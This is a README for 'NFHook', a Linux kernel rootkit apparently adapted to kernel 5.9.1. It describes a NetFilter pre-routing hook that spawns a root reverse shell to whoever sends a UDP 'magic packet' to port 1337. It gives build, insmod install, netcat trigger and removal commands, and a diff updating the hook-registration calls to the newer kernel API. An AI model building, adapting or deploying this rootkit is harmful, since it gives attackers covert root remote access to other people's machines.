# NFHook: NetFilter Hooking rootkit #

# No longer original, Modified by me to specifically work with my kernel version, which was by the time I wrote this, 5.9.1 on Arch.



This rootkit registers a hook in the NetFilter pre-routing chain with high
priority, that is all incoming packets get through this hook first.

Once a "magic packet" is received (UDP packet on port 1337), a root reverse shell is
spawned back to the requester on the very same port.

Make sure you have un reverse shell script in `/usr/bin/reverse_shell.sh`

## Compilation ##
```
	$ make
```

## Installation ##
```
	$ sudo insmod nfhook.ko
```

## Usage ##
```
	$ echo "Hello world" | nc -u $target 1337
```

## Removal ##
```
	$ sudo rmmod nfhook
```

## Disclaimer ##

This is an experimental rootkit. Use it at your own risks.


# Modifications: #




# nfhook.c
      (...)
      // nf_register_hook(&rk_pre_routing);
      // nf_unregister_hook(&rk_pre_routing);
      
      // To
      nf_register_net_hook(&init_net,&rk_pre_routing);
      nf_unregister_net_hook(&init_net,&rk_pre_routing);
      
      
      
References I learned from:
https://elixir.free-electrons.com/linux/v4.13.16/source/net/core/net_namespace.c#L37
https://elixir.bootlin.com/linux/latest/source/include/linux/netfilter.h#L177
https://www.linuxjournal.com/article/7184
